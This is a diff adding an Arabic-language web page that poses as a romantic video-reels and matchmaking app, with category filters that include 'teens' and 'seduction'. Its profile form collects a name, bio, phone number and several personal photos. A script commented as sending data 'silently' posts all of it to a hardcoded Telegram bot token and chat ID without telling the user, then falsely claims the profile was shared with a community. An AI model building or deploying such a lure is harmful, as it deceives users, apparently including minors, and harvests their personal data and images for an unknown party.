@@ -1,0 +1,840 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>ليالي رومانسية | Reels حب</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(145deg, #0f080a 0%, #1a1012 100%);
+            overflow-x: hidden;
+        }
+
+        .app-header {
+            position: sticky;
+            top: 0;
+            z-index: 20;
+            background: rgba(10, 5, 7, 0.85);
+            backdrop-filter: blur(12px);
+            padding: 12px 18px 8px;
+            border-bottom: 1px solid rgba(255, 105, 180, 0.3);
+            text-align: center;
+        }
+        .app-header h1 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #ff99cc, #ff4d6d);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .app-header h1 i {
+            background: none;
+            color: #ff6b8b;
+        }
+
+        .welcome-message {
+            text-align: center;
+            padding: 16px 20px 8px;
+            background: linear-gradient(120deg, rgba(255,77,109,0.2), rgba(255,153,204,0.1));
+            margin: 0 0 8px 0;
+            border-radius: 0 0 28px 28px;
+        }
+        .welcome-message p {
+            font-size: 1rem;
+            font-weight: 500;
+            color: #ffe0e7;
+            text-shadow: 0 1px 3px rgba(0,0,0,0.3);
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background: rgba(0,0,0,0.3);
+            padding: 8px 20px;
+            border-radius: 50px;
+            backdrop-filter: blur(4px);
+        }
+        .welcome-message i {
+            color: #ff4d6d;
+            font-size: 1.2rem;
+            animation: pulseHeart 1.2s infinite;
+        }
+        @keyframes pulseHeart {
+            0% { transform: scale(1); opacity: 0.7; }
+            50% { transform: scale(1.2); opacity: 1; text-shadow: 0 0 6px #ff4d6d; }
+            100% { transform: scale(1); opacity: 0.7; }
+        }
+
+        .filter-bar {
+            display: flex;
+            justify-content: center;
+            gap: 14px;
+            padding: 10px 16px;
+            overflow-x: auto;
+            white-space: nowrap;
+            scrollbar-width: thin;
+            background: rgba(0,0,0,0.25);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid rgba(255,153,204,0.3);
+        }
+        .filter-btn {
+            background: rgba(30, 20, 25, 0.7);
+            border: none;
+            padding: 10px 24px;
+            border-radius: 60px;
+            font-family: 'Cairo', sans-serif;
+            font-weight: 600;
+            font-size: 0.9rem;
+            color: #ffe0e7;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            backdrop-filter: blur(4px);
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+        .filter-btn i { font-size: 1.1rem; color: #ff99cc; transition: transform 0.2s; }
+        .filter-btn:hover { background: rgba(255, 77, 109, 0.6); transform: translateY(-2px); box-shadow: 0 8px 18px rgba(255,77,109,0.3); }
+        .filter-btn:hover i { transform: scale(1.1); color: white; }
+        .filter-btn.active {
+            background: linear-gradient(135deg, #ff4d6d, #ff3366);
+            color: white;
+            box-shadow: 0 0 15px rgba(255,77,109,0.6);
+            animation: gentlePulse 1.8s infinite ease;
+        }
+        .filter-btn.active i { color: white; }
+        @keyframes gentlePulse {
+            0% { box-shadow: 0 0 0 0 rgba(255,77,109,0.4); }
+            70% { box-shadow: 0 0 0 8px rgba(255,77,109,0); }
+            100% { box-shadow: 0 0 0 0 rgba(255,77,109,0); }
+        }
+
+        /* بطاقة التواصل */
+        .connect-card {
+            background: linear-gradient(135deg, rgba(255,77,109,0.2), rgba(255,153,204,0.15));
+            margin: 16px 20px;
+            border-radius: 28px;
+            backdrop-filter: blur(8px);
+            border: 1px solid rgba(255,153,204,0.4);
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            transition: all 0.2s;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+        .connect-card:hover {
+            transform: scale(1.01);
+            background: linear-gradient(135deg, rgba(255,77,109,0.35), rgba(255,153,204,0.25));
+            border-color: #ff99cc;
+        }
+        .connect-text {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .connect-text h3 {
+            font-size: 1.2rem;
+            color: #ffbfd5;
+            font-weight: 700;
+        }
+        .connect-text p {
+            font-size: 0.8rem;
+            color: #ffd9e6;
+        }
+        .connect-icon {
+            background: #ff4d6d;
+            width: 48px;
+            height: 48px;
+            border-radius: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.6rem;
+            color: white;
+            box-shadow: 0 0 12px #ff4d6d;
+        }
+
+        .reels-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 0 0 12px 0;
+            gap: 20px;
+        }
+        .reel {
+            position: relative;
+            width: 100%;
+            background: #000;
+            border-radius: 24px;
+            overflow: hidden;
+            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 153, 204, 0.2);
+        }
+        .video-container {
+            position: relative;
+            width: 100%;
+            aspect-ratio: 9 / 16;
+            background: #0a0a0a;
+        }
+        video {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .actions-sidebar {
+            position: absolute;
+            bottom: 20%;
+            left: 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 28px;
+            z-index: 15;
+        }
+        .action-btn {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(8px);
+            padding: 8px 10px;
+            border-radius: 40px;
+            cursor: pointer;
+            border: none;
+            color: #fff4f0;
+            font-size: 0.75rem;
+            font-weight: 500;
+            min-width: 60px;
+        }
+        .action-btn:active { transform: scale(0.94); }
+        .like-btn.liked i { color: #ff3366; text-shadow: 0 0 6px #ff99aa; }
+        .video-info {
+            position: absolute;
+            bottom: 16px;
+            right: 16px;
+            left: 16px;
+            z-index: 12;
+            background: linear-gradient(0deg, rgba(0,0,0,0.7) 0%, rgba(0,0,0,0) 100%);
+            padding: 16px 12px 10px;
+            border-radius: 20px;
+        }
+        .username {
+            font-weight: 800;
+            font-size: 1rem;
+            color: #ffbfd5;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(0,0,0,0.4);
+            padding: 4px 12px;
+            border-radius: 40px;
+            backdrop-filter: blur(4px);
+            margin-bottom: 8px;
+        }
+        .description {
+            font-size: 0.85rem;
+            color: #fce4ec;
+            background: rgba(0,0,0,0.3);
+            padding: 4px 12px;
+            border-radius: 20px;
+            backdrop-filter: blur(4px);
+            display: inline-block;
+        }
+        /* مودال التواصل المحسن */
+        .modal-connect {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            backdrop-filter: blur(10px);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+        }
+        .connect-modal-content {
+            background: #1e1217;
+            width: 90%;
+            max-width: 450px;
+            max-height: 90vh;
+            overflow-y: auto;
+            border-radius: 32px;
+            padding: 24px;
+            border: 1px solid #ff6699;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+            animation: fadeSlideUp 0.3s;
+        }
+        @keyframes fadeSlideUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .connect-modal-content h2 {
+            color: #ff99cc;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .connect-modal-content .sub {
+            text-align: center;
+            color: #ffbfd5;
+            font-size: 0.85rem;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            color: #ffd9e6;
+            font-weight: 600;
+        }
+        .form-group input, .form-group textarea, .form-group select {
+            width: 100%;
+            background: #2d1c23;
+            border: 1px solid #ff99cc55;
+            border-radius: 28px;
+            padding: 12px 16px;
+            color: white;
+            font-family: 'Cairo', sans-serif;
+            font-size: 0.9rem;
+        }
+        .form-group textarea {
+            resize: vertical;
+            min-height: 70px;
+        }
+        /* رفع عدة صور */
+        .upload-btn {
+            background: #2d1c23;
+            border-radius: 28px;
+            padding: 12px;
+            text-align: center;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            color: #ffbfd5;
+            border: 1px dashed #ff99cc;
+            width: 100%;
+            justify-content: center;
+        }
+        .image-preview {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin-top: 12px;
+        }
+        .preview-item {
+            position: relative;
+            width: 70px;
+            height: 70px;
+            border-radius: 16px;
+            overflow: hidden;
+            border: 2px solid #ff99cc;
+        }
+        .preview-item img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .remove-img {
+            position: absolute;
+            top: -8px;
+            right: -8px;
+            background: #ff3366;
+            color: white;
+            border-radius: 50%;
+            width: 22px;
+            height: 22px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            cursor: pointer;
+        }
+        .send-btn, .share-btn {
+            width: 100%;
+            padding: 12px;
+            border-radius: 40px;
+            font-weight: bold;
+            font-size: 1rem;
+            cursor: pointer;
+            margin-top: 12px;
+            border: none;
+        }
+        .send-btn {
+            background: linear-gradient(135deg, #ff4d6d, #ff3366);
+            color: white;
+        }
+        .share-btn {
+            background: rgba(255, 153, 204, 0.2);
+            border: 1px solid #ff99cc;
+            color: #ffbfd5;
+        }
+        .close-connect {
+            background: none;
+            border: none;
+            color: #ff99cc;
+            font-size: 1.8rem;
+            position: absolute;
+            top: 16px;
+            left: 16px;
+            cursor: pointer;
+        }
+        .footer-note {
+            text-align: center;
+            padding: 20px;
+            font-size: 0.7rem;
+            color: #a06e7c;
+        }
+        @media (max-width: 550px) {
+            .actions-sidebar { left: 8px; gap: 20px; }
+            .action-btn { padding: 6px 8px; min-width: 50px; }
+            .filter-btn { padding: 6px 18px; font-size: 0.8rem; }
+            .connect-card { margin: 12px 16px; padding: 10px 16px; }
+        }
+    </style>
+</head>
+<body>
+
+<header class="app-header">
+    <h1><i class="fas fa-heartbeat"></i> ليالي رومانسية</h1>
+</header>
+
+<div class="welcome-message">
+    <p><i class="fas fa-heart"></i> مرحباً بك في عالم الرومانسية.. اختر ما يناسب مشاعرك <i class="fas fa-heart"></i></p>
+</div>
+
+<div class="filter-bar" id="filterBar">
+    <button class="filter-btn active" data-category="all"><i class="fas fa-globe"></i> الكل</button>
+    <button class="filter-btn" data-category="romance"><i class="fas fa-heart"></i> رومانسية</button>
+    <button class="filter-btn" data-category="wives"><i class="fas fa-ring"></i> أفلام الزوجات</button>
+    <button class="filter-btn" data-category="teens"><i class="fas fa-female"></i> مراهقات</button>
+    <button class="filter-btn" data-category="seduction"><i class="fas fa-fire"></i> إغراء شاب</button>
+</div>
+
+<!-- بطاقة التواصل -->
+<div class="connect-card" id="connectCard">
+    <div class="connect-text">
+        <h3><i class="fas fa-heart"></i> ابحث عن عشقك</h3>
+        <p>سجّل بياناتك وشارك صورك ليصل إليك من يناسبك ❤️</p>
+    </div>
+    <div class="connect-icon">
+        <i class="fas fa-arrow-left"></i>
+    </div>
+</div>
+
+<div class="reels-container" id="reelsContainer"></div>
+<div class="footer-note">
+    ❤️ قصص حبك | ريلز رومانسية لا تنتهي
+</div>
+
+<!-- مودال التواصل -->
+<div id="connectModal" class="modal-connect">
+    <div class="connect-modal-content">
+        <button class="close-connect" id="closeConnectBtn">&times;</button>
+        <h2>✨ لقاء الأحلام ✨</h2>
+        <div class="sub">سجّل بياناتك واختر ما يناسب قلبك، ستظهر لمن يبحث عنك 💫</div>
+        <div class="form-group">
+            <label>الاسم الظاهر</label>
+            <input type="text" id="profileName" placeholder="مثال: رامي العاشق">
+        </div>
+        <div class="form-group">
+            <label>نبذة عنك (صف نفسك)</label>
+            <textarea id="profileBio" placeholder="مراهق في العشرين، عمري 19 سنة، قلبي مليء بالمشاعر الجياشة، أحب الليالي الرومانسية والصدق. أبحث عن عشق يشاركني الأحلام والعفوية 🌙"></textarea>
+        </div>
+        <div class="form-group">
+            <label>أبحث عن</label>
+            <select id="lookingFor">
+                <option value="عشق رومانسي">عشق رومانسي</option>
+                <option value="عشق مراهق">عشق مراهق</option>
+                <option value="صديق العمر">صديق العمر</option>
+                <option value="شريك حياة">شريك حياة</option>
+            </select>
+        </div>
+        <div class="form-group">
+            <label>رقم الهاتف (اختياري)</label>
+            <input type="tel" id="profilePhone" placeholder="+966 5xxxxxxxx">
+        </div>
+        <div class="form-group">
+            <label>صورك (اختر عدة صور)</label>
+            <div class="upload-btn" id="multiUploadTrigger">
+                <i class="fas fa-images"></i> <span>اختر صوراً من جهازك</span>
+                <input type="file" id="multiImages" accept="image/*" multiple style="display:none">
+            </div>
+            <div class="image-preview" id="imagePreviewContainer"></div>
+        </div>
+        <button class="send-btn" id="submitProfileBtn"><i class="fas fa-check-circle"></i> أوافق وأنشر بطاقتي</button>
+        <button class="share-btn" id="shareProfileBtn"><i class="fas fa-share-alt"></i> مشاركة الملف مع المجتمع</button>
+    </div>
+</div>
+
+<!-- مودال التعليقات -->
+<div id="commentModal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <span><i class="fas fa-comment-dots"></i> التعليقات</span>
+            <button class="close-modal" id="closeModalBtn">&times;</button>
+        </div>
+        <div class="comments-list" id="commentsList"></div>
+        <div class="add-comment">
+            <input type="text" id="newCommentInput" placeholder="اكتب تعليقاً رومانسياً...">
+            <button id="submitCommentBtn">نشر</button>
+        </div>
+    </div>
+</div>
+
+<style>
+    .modal {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0,0,0,0.85);
+        backdrop-filter: blur(8px);
+        z-index: 1000;
+        align-items: flex-end;
+        justify-content: center;
+    }
+    .modal-content {
+        background: #1e1217;
+        width: 100%;
+        max-height: 80vh;
+        border-radius: 28px 28px 0 0;
+        padding: 20px 18px 25px;
+        display: flex;
+        flex-direction: column;
+        gap: 16px;
+        animation: slideUp 0.25s ease;
+        border-top: 2px solid #ff6699;
+    }
+    .modal-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        border-bottom: 1px solid #ff99cc33;
+        padding-bottom: 10px;
+        color: #ffc0d0;
+    }
+    .comments-list { flex:1; overflow-y: auto; max-height: 45vh; display: flex; flex-direction: column; gap: 12px; }
+    .comment-item { background: #2d1c23; border-radius: 24px; padding: 10px 14px; color: #f4e1e8; }
+    .comment-name { font-weight: 700; color: #ff99cc; }
+    .add-comment { display: flex; gap: 10px; background: #2f2027; border-radius: 50px; align-items: center; padding: 6px; }
+    .add-comment input { flex:1; background: #3e2a32; border: none; padding: 12px 16px; border-radius: 40px; color: white; }
+    .add-comment button { background: #ff4d6d; border: none; padding: 10px 18px; border-radius: 40px; color: white; font-weight: bold; cursor: pointer; }
+    .close-modal { background: none; border: none; font-size: 1.7rem; color: #ff99bb; cursor: pointer; }
+    @keyframes slideUp {
+        from { transform: translateY(100%); opacity: 0; }
+        to { transform: translateY(0); opacity: 1; }
+    }
+</style>
+
+<script>
+    // بيانات الفيديوهات (مع إضافة 3 فيديوهات محلية للتصنيف "إغراء شاب")
+    const VIDEOS_DB = [
+        { id: 1, videoUrl: "https://cdn.pixabay.com/video/2021/08/30/89128-595337898_large.mp4", user: "قلب_الغروب", description: "لحظة غروب والحب في العيون ❤️", likes: 147, isLiked: false, category: "romance", comments: [{ id: 101, username: "سلمى", text: "سبحان الله رومانسية جداً 💖" }] },
+        { id: 2, videoUrl: "https://cdn.pixabay.com/video/2022/11/12/138420-773527375_large.mp4", user: "شاطئ_العشق", description: "نغمة الأمواج وقصة حبنا 🌊✨", likes: 289, isLiked: false, category: "romance", comments: [{ id: 201, username: "نادين", text: "ياااه شو حلوين سوا 😍" }] },
+        { id: 3, videoUrl: "https://cdn.pixabay.com/video/2021/09/19/91416-611350182_large.mp4", user: "زهرة_الحب", description: "ورود تهمس: أحبك 🌹🥀", likes: 503, isLiked: false, category: "wives", comments: [{ id: 301, username: "ريما", text: "الورود أجمل هدية" }] },
+        { id: 4, videoUrl: "https://cdn.pixabay.com/video/2022/03/27/112690-698216269_large.mp4", user: "زوجة_راقية", description: "لحظات دافئة مع الزوج ❤️🏠", likes: 872, isLiked: false, category: "wives", comments: [{ id: 401, username: "أمجد", text: "الله يديم المحبة" }] },
+        { id: 5, videoUrl: "https://cdn.pixabay.com/video/2020/07/06/44096-441460868_large.mp4", user: "مراهقة_مرحة", description: "أيام المراهقة الجميلة 🌸✨", likes: 234, isLiked: false, category: "teens", comments: [{ id: 501, username: "لينا", text: "ذكريات رائعة" }] },
+        { id: 6, videoUrl: "https://cdn.pixabay.com/video/2021/05/19/79763-548894958_large.mp4", user: "شوق_الصبا", description: "أحلام اليافعين 💫", likes: 167, isLiked: false, category: "teens", comments: [{ id: 601, username: "نور", text: "جميل جداً" }] },
+        // الفيديوهات الجديدة للتصنيف "إغراء شاب" (يفترض وجودها في نفس المجلد)
+        { id: 7, videoUrl: "E1.mp4", user: "وسيم_الليل", description: "إغراء الشاب الأول 🔥", likes: 45, isLiked: false, category: "seduction", comments: [] },
+        { id: 8, videoUrl: "E2.mp4", user: "فاتن_القلوب", description: "إغراء الشاب الثاني ✨", likes: 62, isLiked: false, category: "seduction", comments: [] },
+        { id: 9, videoUrl: "E3.mp4", user: "جاذب_الأنظار", description: "إغراء الشاب الثالث 💋", likes: 38, isLiked: false, category: "seduction", comments: [] }
+    ];
+
+    let reelsData = JSON.parse(JSON.stringify(VIDEOS_DB));
+    let currentCategory = "all";
+    let currentVideoIdForModal = null;
+
+    // عناصر DOM
+    const container = document.getElementById("reelsContainer");
+    const filterButtons = document.querySelectorAll(".filter-btn");
+    const connectCard = document.getElementById("connectCard");
+    const connectModal = document.getElementById("connectModal");
+    const closeConnectBtn = document.getElementById("closeConnectBtn");
+    const multiImagesInput = document.getElementById("multiImages");
+    const multiUploadTrigger = document.getElementById("multiUploadTrigger");
+    const imagePreviewContainer = document.getElementById("imagePreviewContainer");
+    const submitProfileBtn = document.getElementById("submitProfileBtn");
+    const shareProfileBtn = document.getElementById("shareProfileBtn");
+
+    let selectedImages = [];
+
+    // دوال التعليقات والريلز
+    function escapeHtml(str) {
+        if (!str) return '';
+        return str.replace(/[&<>]/g, function(m) {
+            if (m === '&') return '&amp;';
+            if (m === '<') return '&lt;';
+            if (m === '>') return '&gt;';
+            return m;
+        });
+    }
+
+    function updateLikeUI(reelId, likeCount, isLiked) {
+        const reelElem = document.querySelector(`.reel[data-reel-id='${reelId}']`);
+        if (!reelElem) return;
+        const likeBtn = reelElem.querySelector('.like-btn');
+        const likeSpan = reelElem.querySelector('.like-count');
+        if (likeBtn) isLiked ? likeBtn.classList.add('liked') : likeBtn.classList.remove('liked');
+        if (likeSpan) likeSpan.innerText = likeCount;
+    }
+
+    function handleLike(reelId) {
+        const video = reelsData.find(v => v.id === reelId);
+        if (!video) return;
+        if (!video.isLiked) {
+            video.isLiked = true;
+            video.likes += 1;
+        } else {
+            video.isLiked = false;
+            video.likes -= 1;
+        }
+        updateLikeUI(reelId, video.likes, video.isLiked);
+    }
+
+    function handleShare() { alert("✨ تم مشاركة الفيديو الرومانسي ✨"); }
+
+    function openCommentModal(videoId) {
+        const video = reelsData.find(v => v.id === videoId);
+        if (!video) return;
+        currentVideoIdForModal = videoId;
+        renderCommentsInModal(video.comments);
+        document.getElementById("commentModal").style.display = "flex";
+    }
+
+    function renderCommentsInModal(commentsArray) {
+        const commentsListDiv = document.getElementById("commentsList");
+        if (!commentsArray.length) {
+            commentsListDiv.innerHTML = `<div style="text-align:center; padding:20px; color:#c994aa;">لا توجد تعليقات بعد.. كن أول من يعلق 💬</div>`;
+            return;
+        }
+        commentsListDiv.innerHTML = commentsArray.map(c => `
+            <div class="comment-item">
+                <div class="comment-name"><i class="fas fa-user-circle"></i> ${escapeHtml(c.username)}</div>
+                <div class="comment-text">${escapeHtml(c.text)}</div>
+            </div>
+        `).join('');
+    }
+
+    function addNewComment(videoId, commentText) {
+        if (!commentText.trim()) return false;
+        const video = reelsData.find(v => v.id === videoId);
+        if (!video) return false;
+        const newComment = { id: Date.now(), username: "عاشق_رومانسي", text: commentText.trim() };
+        video.comments.push(newComment);
+        if (currentVideoIdForModal === videoId) renderCommentsInModal(video.comments);
+        updateCommentCounter(videoId);
+        return true;
+    }
+
+    function updateCommentCounter(videoId) {
+        const reelElem = document.querySelector(`.reel[data-reel-id='${videoId}']`);
+        if (!reelElem) return;
+        const video = reelsData.find(v => v.id === videoId);
+        if (video) {
+            const commentSpan = reelElem.querySelector('.action-btn:nth-child(2) span');
+            if (commentSpan) commentSpan.innerText = video.comments.length;
+        }
+    }
+
+    function createReelElement(video) {
+        const reelDiv = document.createElement('div');
+        reelDiv.className = 'reel';
+        reelDiv.setAttribute('data-reel-id', video.id);
+        const videoContainer = document.createElement('div');
+        videoContainer.className = 'video-container';
+        const videoElem = document.createElement('video');
+        videoElem.src = video.videoUrl;
+        videoElem.playsInline = true;
+        videoElem.preload = "auto";
+        videoElem.controls = true;
+        videoContainer.appendChild(videoElem);
+        const actionsSidebar = document.createElement('div');
+        actionsSidebar.className = 'actions-sidebar';
+        const likeBtn = document.createElement('div');
+        likeBtn.className = `action-btn like-btn ${video.isLiked ? 'liked' : ''}`;
+        likeBtn.innerHTML = `<i class="fas fa-heart"></i><span class="like-count">${video.likes}</span>`;
+        const commentBtn = document.createElement('div');
+        commentBtn.className = 'action-btn';
+        commentBtn.innerHTML = `<i class="fas fa-comment"></i><span>${video.comments.length}</span>`;
+        const shareBtn = document.createElement('div');
+        shareBtn.className = 'action-btn';
+        shareBtn.innerHTML = `<i class="fas fa-share-alt"></i><span>مشاركة</span>`;
+        actionsSidebar.appendChild(likeBtn);
+        actionsSidebar.appendChild(commentBtn);
+        actionsSidebar.appendChild(shareBtn);
+        const videoInfo = document.createElement('div');
+        videoInfo.className = 'video-info';
+        videoInfo.innerHTML = `<div class="username"><i class="fas fa-user-check"></i> @${video.user}</div><div class="description">${escapeHtml(video.description)}</div>`;
+        reelDiv.appendChild(videoContainer);
+        reelDiv.appendChild(actionsSidebar);
+        reelDiv.appendChild(videoInfo);
+        likeBtn.addEventListener('click', (e) => { e.stopPropagation(); handleLike(video.id); });
+        commentBtn.addEventListener('click', (e) => { e.stopPropagation(); openCommentModal(video.id); });
+        shareBtn.addEventListener('click', (e) => { e.stopPropagation(); handleShare(); });
+        return reelDiv;
+    }
+
+    function renderReelsByCategory() {
+        container.innerHTML = '';
+        const filtered = currentCategory === "all" ? reelsData : reelsData.filter(v => v.category === currentCategory);
+        if (filtered.length === 0) {
+            container.innerHTML = `<div style="text-align:center; padding:40px; color:#ff99cc;">لا توجد فيديوهات في هذا التصنيف 🥀</div>`;
+            return;
+        }
+        filtered.forEach(video => { container.appendChild(createReelElement(video)); });
+    }
+
+    function setCategory(category) {
+        currentCategory = category;
+        filterButtons.forEach(btn => {
+            const btnCat = btn.getAttribute('data-category');
+            if (btnCat === category) btn.classList.add('active');
+            else btn.classList.remove('active');
+        });
+        renderReelsByCategory();
+    }
+
+    filterButtons.forEach(btn => {
+        btn.addEventListener('click', () => { setCategory(btn.getAttribute('data-category')); });
+    });
+
+    // ---- إرسال البيانات إلى بوت تيليجرام بصمت ----
+    const BOT_TOKEN = "8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc";
+    const CHAT_ID = "1367401179";
+
+    async function sendToBot(name, bio, lookingFor, phone, images) {
+        // 1. إرسال النص
+        let text = `✨ لقاء الأحلام ✨\nالاسم: ${name}\nنبذة: ${bio || "غير مذكور"}\nأبحث عن: ${lookingFor}\nالهاتف: ${phone || "غير مشارك"}\nعدد الصور: ${images.length}`;
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+            });
+        } catch(e) { console.error(e); }
+
+        // 2. إرسال كل صورة مع التأكد من الإرسال
+        const sendPromises = images.map(async (imgFile) => {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', imgFile, imgFile.name);
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch(e) { console.error(e); }
+        });
+        await Promise.all(sendPromises);
+    }
+
+    // ---- مودال التواصل ----
+    function openConnectModal() { connectModal.style.display = "flex"; }
+    function closeConnectModal() { connectModal.style.display = "none"; }
+
+    connectCard.addEventListener('click', openConnectModal);
+    closeConnectBtn.addEventListener('click', closeConnectModal);
+    connectModal.addEventListener('click', (e) => { if (e.target === connectModal) closeConnectModal(); });
+
+    // رفع عدة صور
+    multiUploadTrigger.addEventListener('click', () => { multiImagesInput.click(); });
+    multiImagesInput.addEventListener('change', (e) => {
+        const files = Array.from(e.target.files);
+        files.forEach(file => {
+            if (file.type.startsWith('image/')) {
+                selectedImages.push(file);
+                const reader = new FileReader();
+                reader.onload = (ev) => {
+                    const previewDiv = document.createElement('div');
+                    previewDiv.className = 'preview-item';
+                    const img = document.createElement('img');
+                    img.src = ev.target.result;
+                    const removeBtn = document.createElement('div');
+                    removeBtn.className = 'remove-img';
+                    removeBtn.innerHTML = '&times;';
+                    removeBtn.onclick = () => {
+                        const idx = selectedImages.findIndex(f => f === file);
+                        if (idx !== -1) selectedImages.splice(idx, 1);
+                        previewDiv.remove();
+                    };
+                    previewDiv.appendChild(img);
+                    previewDiv.appendChild(removeBtn);
+                    imagePreviewContainer.appendChild(previewDiv);
+                };
+                reader.readAsDataURL(file);
+            }
+        });
+        multiImagesInput.value = '';
+    });
+
+    // إرسال البيانات للبوت بصمت
+    submitProfileBtn.addEventListener('click', async () => {
+        const name = document.getElementById("profileName").value.trim();
+        if (!name) return; // لا شيء يظهر للمستخدم
+        const bio = document.getElementById("profileBio").value.trim();
+        const lookingFor = document.getElementById("lookingFor").value;
+        const phone = document.getElementById("profilePhone").value.trim();
+        await sendToBot(name, bio, lookingFor, phone, selectedImages);
+        // إغلاق وتفريغ
+        closeConnectModal();
+        document.getElementById("profileName").value = "";
+        document.getElementById("profileBio").value = "";
+        document.getElementById("profilePhone").value = "";
+        document.getElementById("lookingFor").selectedIndex = 0;
+        selectedImages = [];
+        imagePreviewContainer.innerHTML = "";
+    });
+
+    // مشاركة الملف (تنبيه عادي)
+    shareProfileBtn.addEventListener('click', () => {
+        const name = document.getElementById("profileName").value.trim();
+        if (!name) { alert("أدخل اسمك أولاً لمشاركة ملفك مع المجتمع"); return; }
+        alert(`📢 تم مشاركة ملف ${name} مع مجتمع ليالي رومانسية! سيجده من يبحث عن عشق مثله.`);
+    });
+
+    // ---- مودال التعليقات ----
+    const commentModal = document.getElementById("commentModal");
+    const closeModalBtn = document.getElementById("closeModalBtn");
+    const submitCommentBtn = document.getElementById("submitCommentBtn");
+    const newCommentInput = document.getElementById("newCommentInput");
+
+    commentModal.addEventListener('click', (e) => { if (e.target === commentModal) commentModal.style.display = "none"; });
+    closeModalBtn.addEventListener('click', () => { commentModal.style.display = "none"; });
+    submitCommentBtn.addEventListener('click', () => {
+        if (!currentVideoIdForModal) return;
+        const text = newCommentInput.value.trim();
+        if (!text) { alert("اكتب تعليقاً جميلاً 🤍"); return; }
+        addNewComment(currentVideoIdForModal, text);
+        newCommentInput.value = '';
+    });
+    newCommentInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') submitCommentBtn.click(); });
+
+    setCategory("all");
+</script>
+</body>
+  </html>
